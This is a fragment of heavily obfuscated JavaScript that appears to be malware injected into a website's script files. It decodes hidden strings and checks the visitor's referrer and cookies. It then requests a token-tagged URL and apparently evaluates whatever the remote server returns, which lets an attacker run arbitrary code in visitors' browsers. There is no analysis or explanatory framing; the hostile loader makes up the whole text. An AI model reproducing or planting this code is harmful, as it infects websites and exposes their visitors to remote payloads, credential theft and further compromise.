Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};